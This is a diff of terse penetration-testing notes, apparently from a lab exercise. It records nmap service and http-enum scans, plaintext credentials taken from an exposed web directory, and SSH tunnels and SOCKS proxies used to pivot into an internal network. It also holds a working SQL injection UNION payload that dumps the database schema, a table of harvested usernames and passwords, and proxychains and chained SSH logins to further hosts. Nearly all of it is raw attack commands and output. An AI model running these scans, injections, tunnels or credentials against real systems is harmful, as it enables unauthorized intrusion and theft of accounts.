@@ -1,26 +1,58 @@
 GRRA-023-M, lvaZsAC2R0TC, 10.50.15.72
-
+nmap -sV -sT -T5 -Pn 10.50.15.72
 	Nmap scan report for 10.50.15.72
 	PORT   STATE    SERVICE VERSION
 	22/tcp open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
 	53/tcp filtered domain
 	80/tcp open     http    Apache httpd 2.4.29 ((Ubuntu))
-	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+nmap -Pn -sT -p80 --script http-enum 10.50.15.72		
+		PORT   STATE SERVICE
+		80/tcp open  http
+		| http-enum: 
+		|   /login.php: Possible admin folder
+		|   /login.html: Possible admin folder
+		|   /img/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+		|_  /scripts/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+nmap -Pn -sT -p80 --script http-robots.txt 10.50.15.72
+			PORT   STATE SERVICE
+			80/tcp open  http
 
+found on /scripts:
+	system_user=user2
+	user_password=TurkeyDay24
 
+ssh -MS /tmp/user2 user2@10.50.15.72 -L 19500:10.50.15.72:80 -D 9050
+cat /etc/hosts: 192.168.28.175 BestWebApp
+	
 
+http-enum :8000
 
+ ssh -MS /tmp/user2 user2@10.50.15.72 -L 19500:10.50.15.72:80-L 19501:192.168.28.175:8000 -D 9050
+firefox http://127.0.0.1:19501 &
+	http://127.0.0.1:19501/pick.php?product=7%20UNION%20SELECT%20table_schema,Table_name,column_name%20From%20information_schema.columns;
+	username,name,user_id from siteusers.$users
+		appleBottomJ3an$	          nccyrObggbzW3na$ 	1 	$Aaron
+		TurkeyDay24	          GhexrlQnl24	        2       $user2
+		Bob4THEPin3apples         Obo4GURCva3nccyrf 	3 	$user3
+			                  Lroth 	 	4       $Lee_Roth
+		anotherpassword4THEages  nabgurecnffjbeq4GURntrf 	4 	$Lroth
 
+Nmap scan report for 192.168.28.165
+PORT     STATE  SERVICE
+22/tcp   open   ssh
+8888/tcp open   sun-answerbook
 
+Nmap scan report for 192.168.28.175
+8000/tcp open   http-alt
 
+proxychains ssh user3@192.168.28.165 
+Bob4THEPin3apples
 
+192.168.28.189
+aaron
+nc = 22/ssh
 
-
-
-
-
-
-
-
-
+ssh -MS /tmp/user2 user2@10.50.15.72 -L 19500:10.50.15.72:80 -L 19501:192.168.28.175:8000 -L 19502:192.168.28.175:2222 -L 19503:192.168.28.165:22 -L 19504:192.168.28.165:8888
+ ssh -MS /tmp/189 -p 19503 user3@localhost -L 19506:192.168.28.189:22
+ssh Aaron@localhost -p 19506
 
